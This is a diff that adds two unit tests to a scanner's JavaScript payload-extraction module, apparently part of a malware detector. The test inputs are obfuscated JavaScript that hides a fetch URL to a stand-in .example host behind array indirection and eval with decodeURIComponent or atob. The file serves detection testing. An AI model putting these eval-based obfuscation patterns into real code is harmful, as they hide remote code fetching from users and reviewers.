@@ -9424,6 +9424,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_assigned_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["https%3A%2F%2Fdecode-assigned-array-index-js.example%2Fp"]; var e = a[0]; eval(decodeURIComponent(e))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-assigned-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent assigned array index URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_decodeuricomponent_concat_arg_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"var p = "https%3A%2F%2Fdecode-concat-arg-js."; var q = "example%2Fp"; eval(decodeURIComponent(p + q))"#
@@ -10068,6 +10087,28 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS atob array index payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_assigned_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-assigned-array-index-js.example/p')",
+        );
+        let js = format!(r#"var a = ["{encoded}"]; var b = a[0]; eval(atob(b))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-assigned-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob assigned array index payload URL missed: {:?}",
             env.traits
         );
     }
